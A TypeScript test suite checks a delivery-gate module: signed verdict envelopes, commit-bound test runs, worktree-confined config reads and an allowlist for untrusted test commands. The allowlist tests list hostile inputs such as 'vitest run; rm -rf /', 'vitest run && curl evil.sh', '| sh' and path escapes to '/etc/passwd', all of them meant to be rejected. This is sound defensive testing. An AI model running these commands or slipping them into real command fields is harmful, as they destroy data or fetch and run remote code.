/**
 * delivery gate module contract tests.
 *
 * Proves the module stands on its own inside the SDK ; every test imports the
 * module's own files, never a consumer's re-export, and every I/O seam is driven
 * by an injected mock. The properties under test are the ones a signed envelope
 * rests on:
 *
 *   - the deterministic anchor floor is HARD and named by AnchorId, so the
 *     control plane's `checkRequiredAnchors` finds it in the signed verdicts;
 *   - an execution-grounded anchor NEVER passes on the producer's self-reported
 *     `ci_passed` ; no run, no B3 commit binding, no seal;
 *   - the config-valid anchor reads real bytes and cannot be pointed outside the
 *     worktree;
 *   - `validateTestCommand` is the single zero-trust allowlist over an untrusted
 *     producer-declared command.
 *
 * The preste suite (`packages/cli/src/delivery/*.test.ts`) covers the same
 * machinery from its own call sites and is the non-regression proof for the
 * extraction; this suite is the module's own contract.
 */

import { generateKeyPairSync } from "node:crypto";
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import {
  type GateDecisionCore,
  checkRequiredAnchors,
  verifyGateEnvelope,
} from "../compute/battery/gate-envelope.js";
import { createEd25519Signer, createEd25519Verifier } from "../remote/signing.js";
import { ADVERSARY_ANGLES, buildAdversaryLenses } from "./adversary.js";
import {
  ANCHOR_CHECKS,
  CONFIG_GROUNDED_ANCHORS,
  EXECUTION_GROUNDED_ANCHORS,
} from "./anchor-checks.js";
import { runConfigValidation } from "./config-validation.js";
import { DRIFT_ANCHOR_ID, buildDriftLens } from "./drift-lens.js";
import { buildAnchorLens, runDriftGate, runGate } from "./gate-runner.js";
import { extractTestFailureDetail, runGroundedTests } from "./grounded-tests.js";
import { validateTestCommand } from "./node-exec.js";
import type { AnchorSpecInput, ExecFn, FileReader } from "./types.js";

const { publicKey, privateKey } = generateKeyPairSync("ed25519");
const sign = createEd25519Signer(privateKey);
const verify = createEd25519Verifier(publicKey);

const { privateKey: driftPrivateKey } = generateKeyPairSync("ed25519");
const driftSign = createEd25519Signer(driftPrivateKey);

const PURE_ANCHORS: AnchorSpecInput[] = [
  { id: "json-schema", kind: "pure" },
  { id: "nonempty-fields", kind: "pure" },
];

const GOOD_ARTIFACT = JSON.stringify({
  intent: "ship the feature template",
  scope: { in: ["packages/agent-sdk"], out: [] },
  success_criteria: ["the envelope carries real verdicts"],
});

const baseGateInput = {
  stageId: "cadrage",
  runId: "run-delivery-1",
  adrEco: "ADR-ECO-DELIVERY-FACTORY-V1",
  attempt: 1,
  commit: "deadbeef",
  producerId: "usine-engine",
  keyid: "verifier-v1",
  sign,
};

/** An ExecFn that answers a fixed script of commands and records what it saw. */
function mockExec(
  script: Record<string, { exitCode: number; stdout: string; stderr?: string }>,
): ExecFn & { calls: Array<{ cmd: string; cwd: string }> } {
  const calls: Array<{ cmd: string; cwd: string }> = [];
  const fn = ((cmd: string, cwd: string) => {
    calls.push({ cmd, cwd });
    const hit = script[cmd];
    if (!hit) throw new Error(`unscripted command: ${cmd}`);
    return { exitCode: hit.exitCode, stdout: hit.stdout, stderr: hit.stderr ?? "" };
  }) as ExecFn & { calls: Array<{ cmd: string; cwd: string }> };
  fn.calls = calls;
  return fn;
}

// ─── The signed floor ─────────────────────────────────────────────────────────

describe("runGate: the signed deterministic floor", () => {
  it("produces an envelope the control-plane verification accepts", async () => {
    const { accepted, envelope } = await runGate({
      ...baseGateInput,
      artifact: GOOD_ARTIFACT,
      anchors: PURE_ANCHORS,
    });

    expect(accepted).toBe(true);
    await expect(verifyGateEnvelope(envelope, verify)).resolves.toMatchObject({
      valid: true,
    });
    const floor = checkRequiredAnchors(envelope.decisionCore, ["json-schema", "nonempty-fields"]);
    expect(floor.valid).toBe(true);
  });

  it("fills decisionCore.verdicts with one lensVerdict per required anchor", async () => {
    const { envelope } = await runGate({
      ...baseGateInput,
      artifact: GOOD_ARTIFACT,
      anchors: PURE_ANCHORS,
    });

    const core: GateDecisionCore = envelope.decisionCore;
    expect(core.verdicts).toHaveLength(1);
    const names = core.verdicts[0]!.lensVerdicts.map((l) => l.lens);
    expect(names).toEqual(["json-schema", "nonempty-fields"]);
  });

  it("denies when a hard anchor fails, and the envelope is still signed", async () => {
    const { accepted, envelope, reasons } = await runGate({
      ...baseGateInput,
      // scope + success_criteria empty ; nonempty-fields fires.
      artifact: JSON.stringify({ scope: {}, success_criteria: [] }),
      anchors: PURE_ANCHORS,
    });

    expect(accepted).toBe(false);
    expect(reasons.join(" ")).toContain("nonempty-fields");
    // Signature and outputHash still check out ; the ONLY complaint is the
    // non-admission, which is exactly what a denied gate must look like.
    const v = await verifyGateEnvelope(envelope, verify);
    expect(v.reasons).toEqual([
      "decisionCore is not admitted (acceptedIndex is null = all candidates killed)",
    ]);
    expect(checkRequiredAnchors(envelope.decisionCore, ["nonempty-fields"]).valid).toBe(false);
  });

  it("fails closed on an anchor id it does not implement", async () => {
    const spec: AnchorSpecInput = {
      id: "anchor-that-does-not-exist",
      kind: "pure",
    };
    const { accepted, reasons } = await runGate({
      ...baseGateInput,
      artifact: GOOD_ARTIFACT,
      anchors: [spec],
    });

    expect(accepted).toBe(false);
    expect(reasons.join(" ")).toContain(spec.id);
    const verdict = await buildAnchorLens(spec).verifier.evaluate(GOOD_ARTIFACT);
    expect(verdict.score).toBe(0);
    expect(verdict.rationale).toContain("unknown anchor");
  });
});

describe("buildAnchorLens: the floor binding", () => {
  it("names the lens by AnchorId and wires it hard + affirm", () => {
    const lens = buildAnchorLens({ id: "json-schema", kind: "pure" });
    expect(lens.verifier.name).toBe("json-schema");
    expect(lens.criticality).toBe("hard");
    expect(lens.polarity).toBe("affirm");
  });

  it("maps kind to the lens engine (ci -> execution, pure -> rule)", () => {
    expect(buildAnchorLens({ id: "ci-green", kind: "ci" }).signature).toEqual({
      engine: "execution",
    });
    expect(buildAnchorLens({ id: "json-schema", kind: "pure" }).signature).toEqual({
      engine: "rule",
    });
  });

  it("denies a grounded anchor when no test actually ran (no self-attestation)", () => {
    const lens = buildAnchorLens({ id: "ci-green", kind: "ci" });
    // The artifact self-reports a green CI; the lens must ignore it entirely.
    const verdict = lens.verifier.evaluate(
      JSON.stringify({ ci_run_ref: "run-42", ci_passed: true }),
    );
    expect(verdict).toMatchObject({ score: 0 });
  });

  it("denies a config-grounded anchor when no validation result was computed", () => {
    const lens = buildAnchorLens({ id: "config-valid", kind: "pure" });
    const verdict = lens.verifier.evaluate("{}");
    expect(verdict).toMatchObject({ score: 0 });
  });

  it("classifies the grounded anchor families", () => {
    expect([...EXECUTION_GROUNDED_ANCHORS]).toEqual([
      "ci-green",
      "ci-e2e-green",
      "pass-count",
      "pass-count-positive",
    ]);
    expect([...CONFIG_GROUNDED_ANCHORS]).toEqual(["config-valid"]);
    // config-valid is content-grounded, so it has NO pure implementation.
    expect(ANCHOR_CHECKS["config-valid"]).toBeUndefined();
  });
});

// ─── Execution grounding + the B3 commit binding ──────────────────────────────

describe("runGroundedTests: no run, no seal", () => {
  const CODE_ARTIFACT = JSON.stringify({
    worktree: "/tmp/wt",
    test_cmd: "vitest run",
    commit: "abc1234",
  });

  it("fails closed with no executor wired", () => {
    const r = runGroundedTests(CODE_ARTIFACT, undefined, "abc1234");
    expect(r.ran).toBe(false);
    expect(r.rationale).toContain("no executor wired");
  });

  it("fails closed when the artifact declares no worktree or test_cmd", () => {
    const r = runGroundedTests(JSON.stringify({ commit: "abc1234" }), mockExec({}), "abc1234");
    expect(r.ran).toBe(false);
    expect(r.rationale).toContain("worktree + test_cmd");
  });

  it("fails closed when no verifiable commit is supplied (B3)", () => {
    const exec = mockExec({});
    const r = runGroundedTests(
      JSON.stringify({ worktree: "/tmp/wt", test_cmd: "vitest run" }),
      exec,
      "unknown",
    );
    expect(r.ran).toBe(false);
    expect(r.rationale).toContain("B3");
    expect(exec.calls).toHaveLength(0); // nothing was spawned
  });

  it("fails closed and runs no test when worktree HEAD != declared commit (B3)", () => {
    const gitExec = mockExec({
      "git rev-parse HEAD": { exitCode: 0, stdout: "0000000badf00d\n" },
    });
    const exec = mockExec({});
    const r = runGroundedTests(CODE_ARTIFACT, exec, "abc1234", gitExec);
    expect(r.ran).toBe(false);
    expect(r.rationale).toContain("does not match declared commit");
    expect(exec.calls).toHaveLength(0);
  });

  it("runs the declared command once when HEAD matches, and reports the real exit code", () => {
    const gitExec = mockExec({
      "git rev-parse HEAD": { exitCode: 0, stdout: "abc1234deadbeef\n" },
    });
    const exec = mockExec({
      "vitest run": { exitCode: 0, stdout: "7 passed, 0 failed" },
    });
    const r = runGroundedTests(CODE_ARTIFACT, exec, "abc1234", gitExec);
    expect(r).toMatchObject({
      ran: true,
      exitCode: 0,
      passCount: 7,
      failCount: 0,
    });
    expect(exec.calls).toEqual([{ cmd: "vitest run", cwd: "/tmp/wt" }]);
  });

  it("carries the failing-test detail into the rationale on a red run", () => {
    const gitExec = mockExec({
      "git rev-parse HEAD": { exitCode: 0, stdout: "abc1234deadbeef\n" },
    });
    const exec = mockExec({
      "vitest run": {
        exitCode: 1,
        stdout: "1 passed, 1 failed\nnot ok 2 - adds two numbers",
      },
    });
    const r = runGroundedTests(CODE_ARTIFACT, exec, "abc1234", gitExec);
    expect(r.ran).toBe(true);
    expect(r.exitCode).toBe(1);
    expect(r.rationale).toContain("adds two numbers");
  });

  it("fails closed when the executor throws (a rejected command is a deny)", () => {
    const gitExec = mockExec({
      "git rev-parse HEAD": { exitCode: 0, stdout: "abc1234deadbeef\n" },
    });
    const throwingExec: ExecFn = () => {
      throw new Error("not in the allowed test-runner set");
    };
    const r = runGroundedTests(CODE_ARTIFACT, throwingExec, "abc1234", gitExec);
    expect(r.ran).toBe(false);
    expect(r.rationale).toContain("executor threw");
  });
});

describe("extractTestFailureDetail", () => {
  it("picks the failing-assertion lines and bounds the snippet", () => {
    const detail = extractTestFailureDetail(
      ["ok 1 - fine", "not ok 2 - broken", "AssertionError: 1 !== 2"].join("\n"),
    );
    expect(detail).toContain("not ok 2 - broken");
    expect(detail).toContain("AssertionError");
    expect(detail).not.toContain("ok 1 - fine");
    expect(detail.length).toBeLessThanOrEqual(700);
  });
});

// ─── Content grounding (config-valid) ─────────────────────────────────────────

describe("runConfigValidation: reads real bytes, stays inside the worktree", () => {
  let wt: string;

  beforeEach(() => {
    wt = mkdtempSync(join(tmpdir(), "delivery-config-"));
  });

  afterEach(() => {
    rmSync(wt, { recursive: true, force: true });
  });

  // The injected reader is a REAL filesystem read, supplied by the test ; that is
  // the point of the seam: runConfigValidation itself imports no fs module.
  const realReader: FileReader = (p) => readFileSync(p, "utf-8");

  it("fails closed with no reader wired", () => {
    const r = runConfigValidation(
      JSON.stringify({ worktree: wt, files_changed: ["a.yml"] }),
      undefined,
    );
    expect(r).toMatchObject({ ran: false, valid: false });
    expect(r.rationale).toContain("no file reader wired");
  });

  it("rejects a ../ escape without reading anything", () => {
    const reader = vi.fn<FileReader>();
    const r = runConfigValidation(
      JSON.stringify({ worktree: wt, files_changed: ["../evil.yml"] }),
      reader,
    );
    expect(r).toMatchObject({ ran: true, valid: false });
    expect(r.rationale).toContain("escapes the worktree");
    expect(reader).not.toHaveBeenCalled();
  });

  it("rejects an absolute path without reading anything", () => {
    const reader = vi.fn<FileReader>();
    const r = runConfigValidation(
      JSON.stringify({ worktree: wt, files_changed: ["/etc/passwd"] }),
      reader,
    );
    expect(r).toMatchObject({ ran: true, valid: false });
    expect(r.rationale).toContain("absolute path");
    expect(reader).not.toHaveBeenCalled();
  });

  it("validates yaml, json and Dockerfile content declared in the worktree", () => {
    writeFileSync(join(wt, "deploy.yml"), "kind: Deployment\n");
    writeFileSync(join(wt, "pkg.json"), '{"name":"x"}');
    writeFileSync(join(wt, "Dockerfile"), "FROM node:22-alpine\n");
    const r = runConfigValidation(
      JSON.stringify({
        worktree: wt,
        files_changed: ["deploy.yml", "pkg.json", "Dockerfile"],
      }),
      realReader,
    );
    expect(r).toMatchObject({ ran: true, valid: true });
  });

  it("fails closed on a declared file the producer never wrote", () => {
    const r = runConfigValidation(
      JSON.stringify({ worktree: wt, files_changed: ["never-written.yml"] }),
      realReader,
    );
    expect(r).toMatchObject({ ran: true, valid: false });
    expect(r.rationale).toContain("could not be read");
  });

  it("fails closed on a Dockerfile with no FROM", () => {
    writeFileSync(join(wt, "Dockerfile"), "# just a comment\n");
    const r = runConfigValidation(
      JSON.stringify({ worktree: wt, files_changed: ["Dockerfile"] }),
      realReader,
    );
    expect(r).toMatchObject({ ran: true, valid: false });
    expect(r.rationale).toContain("no FROM instruction");
  });

  it("is wired into runGate through the config-valid anchor", async () => {
    writeFileSync(join(wt, "deploy.yml"), "kind: Deployment\n");
    const artifact = JSON.stringify({
      worktree: wt,
      files_changed: ["deploy.yml"],
    });
    const { accepted } = await runGate({
      ...baseGateInput,
      artifact,
      anchors: [{ id: "config-valid", kind: "pure" }],
      readFile: realReader,
    });
    expect(accepted).toBe(true);

    // Same artifact, no reader wired ; the anchor must deny.
    const denied = await runGate({
      ...baseGateInput,
      artifact,
      anchors: [{ id: "config-valid", kind: "pure" }],
    });
    expect(denied.accepted).toBe(false);
  });
});

// ─── The zero-trust command allowlist ─────────────────────────────────────────

describe("validateTestCommand: the single security allowlist", () => {
  let wt: string;

  beforeEach(() => {
    wt = mkdtempSync(join(tmpdir(), "delivery-cmd-"));
  });

  afterEach(() => {
    rmSync(wt, { recursive: true, force: true });
  });

  it("accepts the allowed runner shapes", () => {
    expect(validateTestCommand("vitest run", wt)).toEqual({
      bin: "vitest",
      args: ["run"],
    });
    expect(validateTestCommand("pnpm test --filter web", wt).bin).toBe("pnpm");
    expect(validateTestCommand("node --test", wt).bin).toBe("node");
    expect(validateTestCommand("cargo test", wt).bin).toBe("cargo");
    expect(validateTestCommand("make", wt).bin).toBe("make");
  });

  it("rejects a non-absolute or non-existent worktree", () => {
    expect(() => validateTestCommand("vitest run", "relative/path")).toThrow(/absolute path/);
    expect(() => validateTestCommand("vitest run", join(wt, "does-not-exist"))).toThrow(
      /does not exist/,
    );
  });

  it("rejects shell metacharacters (no chaining, redirection, substitution)", () => {
    for (const cmd of [
      "vitest run; rm -rf /",
      "vitest run && curl evil.sh",
      "vitest run > /tmp/out",
      "vitest run $(whoami)",
      "vitest run `id`",
      "vitest run | sh",
    ]) {
      expect(() => validateTestCommand(cmd, wt)).toThrow(/shell metacharacters/);
    }
  });

  it("rejects code-exec flags and arbitrary-package subcommands on any token", () => {
    expect(() => validateTestCommand("node --test -e evil", wt)).toThrow(/execute arbitrary code/);
    expect(() => validateTestCommand("vitest run --require evil", wt)).toThrow(
      /execute arbitrary code/,
    );
    expect(() => validateTestCommand("pnpm dlx evil-pkg", wt)).toThrow(/arbitrary packages/);
  });

  it("rejects a bare interpreter and any binary outside the allowlist", () => {
    expect(() => validateTestCommand("node evil.js", wt)).toThrow(
      /not in the allowed test-runner set/,
    );
    expect(() => validateTestCommand("bash run.sh", wt)).toThrow(
      /not in the allowed test-runner set/,
    );
    expect(() => validateTestCommand("python evil.py", wt)).toThrow(
      /not in the allowed test-runner set/,
    );
  });

  it("requires a package manager to invoke the literal test script first", () => {
    expect(() => validateTestCommand("pnpm --filter web test", wt)).toThrow(
      /must invoke the 'test' script first/,
    );
    expect(() => validateTestCommand("npm run build", wt)).toThrow(
      /must invoke the 'test' script first/,
    );
  });

  it("rejects a cargo/go subcommand that is not a test subcommand", () => {
    expect(() => validateTestCommand("cargo build", wt)).toThrow(/not an allowed test subcommand/);
    expect(() => validateTestCommand("go build ./...", wt)).toThrow(
      /not an allowed test subcommand/,
    );
  });

  it("rejects make flags that escape the worktree", () => {
    expect(() => validateTestCommand("make -C /elsewhere", wt)).toThrow(/can escape the worktree/);
    expect(() => validateTestCommand("make -f /tmp/Makefile", wt)).toThrow(
      /can escape the worktree/,
    );
  });

  // ── Flag value vs subcommand position ──────────────────────────────────────

  it("accepts a flag VALUE that collides with a dangerous verb", () => {
    // The documented compliant form, which the every-token scan used to refuse:
    // `x` is the package selected by --filter, it is not `pnpm x`.
    expect(validateTestCommand("pnpm test --filter x", wt)).toEqual({
      bin: "pnpm",
      args: ["test", "--filter", "x"],
    });
    expect(validateTestCommand("pnpm test --filter create", wt).bin).toBe("pnpm");
    expect(validateTestCommand("vitest run --reporter exec", wt).bin).toBe("vitest");
  });

  it("still rejects a dangerous verb in subcommand position", () => {
    for (const cmd of ["pnpm exec whatever", "npm x evil-pkg", "yarn create evil-app"]) {
      expect(() => validateTestCommand(cmd, wt)).toThrow(/runs arbitrary packages/);
    }
  });

  it("rejects a dangerous flag in its joined --flag=value form", () => {
    // The set lists the split form; comparing the raw token let the joined form
    // through, which was a real bypass of the code-exec guard.
    expect(() => validateTestCommand("vitest run --require=evil.js", wt)).toThrow(
      /execute arbitrary code/,
    );
    expect(() => validateTestCommand("node --test --eval=pwned", wt)).toThrow(
      /execute arbitrary code/,
    );
    expect(() => validateTestCommand("make --file=/tmp/Makefile", wt)).toThrow(
      /can escape the worktree/,
    );
  });

  // ── Static checkers (typecheck / lint / build) ─────────────────────────────

  it("accepts the static checkers a TypeScript repo gates on", () => {
    expect(validateTestCommand("tsc --noEmit", wt)).toEqual({ bin: "tsc", args: ["--noEmit"] });
    expect(validateTestCommand("tsc", wt)).toEqual({ bin: "tsc", args: [] });
    expect(validateTestCommand("biome check src/ scripts/", wt)).toEqual({
      bin: "biome",
      args: ["check", "src/", "scripts/"],
    });
    expect(validateTestCommand("biome ci src test", wt).bin).toBe("biome");
  });

  it("rejects tsc flags that move the oracle or never terminate", () => {
    // --project/--build compile a DIFFERENT tsconfig; --watch never exits.
    expect(() => validateTestCommand("tsc --project ../other/tsconfig.json", wt)).toThrow(
      /moves the oracle/,
    );
    expect(() => validateTestCommand("tsc --build", wt)).toThrow(/moves the oracle/);
    expect(() => validateTestCommand("tsc --watch --noEmit", wt)).toThrow(/moves the oracle/);
  });

  it("rejects a tsc positional (it would bypass tsconfig.json entirely)", () => {
    // `tsc src/foo.ts` ignores tsconfig.json and checks that file under default,
    // NON-STRICT options: a green that says nothing about the project.
    expect(() => validateTestCommand("tsc src/foo.ts", wt)).toThrow(/takes no positional/);
  });

  it("rejects biome flags that repair what they measure", () => {
    for (const cmd of [
      "biome check --write src/",
      "biome check --fix src/",
      "biome check --unsafe src/",
      "biome check --config-path=../evil",
    ]) {
      expect(() => validateTestCommand(cmd, wt)).toThrow(/moves the oracle/);
    }
  });

  it("rejects a biome subcommand outside the read-only set", () => {
    expect(() => validateTestCommand("biome start", wt)).toThrow(
      /is not an allowed checker subcommand/,
    );
    expect(() => validateTestCommand("biome migrate", wt)).toThrow(
      /is not an allowed checker subcommand/,
    );
  });

  it("rejects a checker aimed outside the worktree", () => {
    expect(() => validateTestCommand("biome check ../other", wt)).toThrow(/escapes the worktree/);
    expect(() => validateTestCommand("biome check /etc", wt)).toThrow(/escapes the worktree/);
  });

  it("keeps eslint and package-runners out of the allowlist", () => {
    // eslint.config.js IS JavaScript, executed at load, and its plugins are
    // arbitrary JS modules: allowing eslint would allow arbitrary code by design.
    expect(() => validateTestCommand("eslint src/", wt)).toThrow(
      /not in the allowed test-runner set/,
    );
    expect(() => validateTestCommand("npx tsc --noEmit", wt)).toThrow(
      /not in the allowed test-runner set/,
    );
    expect(() => validateTestCommand("ts-node script.ts", wt)).toThrow(
      /not in the allowed test-runner set/,
    );
  });
});

// ─── Adversarial twin (soft, on top of the floor) ─────────────────────────────

describe("buildAdversaryLenses: soft lenses that never seal", () => {
  const refute = async () => ({ refuted: false, rationale: "ok" });

  it("produces 0 / 1 / N lenses per intensity, on distinct angles", () => {
    expect(
      buildAdversaryLenses({
        stageId: "s",
        artifact: "{}",
        config: { intensity: "none" },
        refute,
      }),
    ).toHaveLength(0);

    const judge = buildAdversaryLenses({
      stageId: "s",
      artifact: "{}",
      config: { intensity: "judge" },
      refute,
    });
    expect(judge).toHaveLength(1);
    expect(judge[0]!.criticality).toBe("soft");
    expect(judge[0]!.polarity).toBe("refute");
    expect(judge[0]!.signature).toEqual({ engine: "llm-judge" });

    const quorum = buildAdversaryLenses({
      stageId: "s",
      artifact: "{}",
      config: { intensity: "refute-quorum", lenses: 3 },
      refute,
    });
    expect(quorum).toHaveLength(3);
    expect(new Set(quorum.map((l) => l.verifier.name)).size).toBe(3);
    expect(ADVERSARY_ANGLES.length).toBeGreaterThanOrEqual(3);
  });

  it("does not weaken the hard floor: a failing anchor denies even when the twin agrees", async () => {
    const { accepted } = await runGate({
      ...baseGateInput,
      artifact: JSON.stringify({ scope: {}, success_criteria: [] }),
      anchors: PURE_ANCHORS,
      adversary: { config: { intensity: "judge" }, refute },
    });
    expect(accepted).toBe(false);
  });
});

// ─── Drift twin (second independent attestation) ──────────────────────────────

describe("runDriftGate: the second independent attestation", () => {
  const intent = { scope: { allowed_paths: ["packages/agent-sdk/"] } };

  it("fails closed without an executor", () => {
    const lens = buildDriftLens(intent, undefined, undefined);
    expect(lens.verifier.name).toBe(DRIFT_ANCHOR_ID);
    expect(lens.verifier.evaluate("{}")).toMatchObject({ score: 0 });
  });

  it("shares the primary envelope identity and carries a distinct keyid", async () => {
    const artifact = JSON.stringify({
      worktree: "/tmp/wt",
      diff_base: "1111111",
      diff_head: "deadbeef",
    });
    const primary = await runGate({
      ...baseGateInput,
      artifact,
      anchors: [{ id: "json-schema", kind: "pure" }],
    });

    const drift = await runDriftGate({
      primaryEnvelope: primary.envelope,
      artifact,
      intent,
      driftArtifact: {
        worktree: "/tmp/wt",
        diff_base: "1111111",
        diff_head: "deadbeef",
      },
      keyid: "drift-v1",
      adrEco: baseGateInput.adrEco,
      sign: driftSign,
      exec: mockExec({
        "git diff --name-only 1111111..deadbeef": {
          exitCode: 0,
          stdout: "packages/agent-sdk/src/delivery/gate-runner.ts\n",
        },
      }),
    });

    expect(drift.accepted).toBe(true);
    expect(drift.envelope.runId).toBe(primary.envelope.runId);
    expect(drift.envelope.stageId).toBe(primary.envelope.stageId);
    expect(drift.envelope.commit).toBe(primary.envelope.commit);
    // Anti-splice: both envelopes attest the SAME artifact bytes.
    expect(drift.envelope.artifactHash).toBe(primary.envelope.artifactHash);
    expect(drift.envelope.keyid).not.toBe(primary.envelope.keyid);
    expect(checkRequiredAnchors(drift.envelope.decisionCore, [DRIFT_ANCHOR_ID]).valid).toBe(true);
  });

  it("denies when a changed file falls outside the frozen scope", async () => {
    const artifact = JSON.stringify({ ok: true });
    const primary = await runGate({
      ...baseGateInput,
      artifact,
      anchors: [{ id: "json-schema", kind: "pure" }],
    });

    const drift = await runDriftGate({
      primaryEnvelope: primary.envelope,
      artifact,
      intent,
      driftArtifact: {
        worktree: "/tmp/wt",
        diff_base: "1111111",
        diff_head: "deadbeef",
      },
      keyid: "drift-v1",
      adrEco: baseGateInput.adrEco,
      sign: driftSign,
      exec: mockExec({
        "git diff --name-only 1111111..deadbeef": {
          exitCode: 0,
          stdout: "infra/secrets/prod.env\n",
        },
      }),
    });

    expect(drift.accepted).toBe(false);
    expect(drift.reasons.join(" ")).toContain(DRIFT_ANCHOR_ID);
  });
});
